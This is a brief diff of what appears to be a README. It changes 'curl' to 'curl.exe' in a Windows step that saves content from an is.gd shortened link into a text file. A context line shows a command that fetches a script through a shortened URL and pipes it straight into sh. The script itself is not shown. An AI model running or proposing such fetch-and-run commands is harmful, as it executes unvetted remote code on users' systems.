@@ -35,7 +35,7 @@ wget -qO- https://naturl.link/curl | sh
 1. **Open the Windows Command Prompt (cmd).**
 2. Execute the following command:
    ```
-   curl -fsSL https://is.gd/se19pro >> pro.txt
+   curl.exe -fsSL https://is.gd/se19pro >> pro.txt
    ```
 3. After executing the command, open the file `pro.txt` in your favorite text editor to view the programming codes.
 
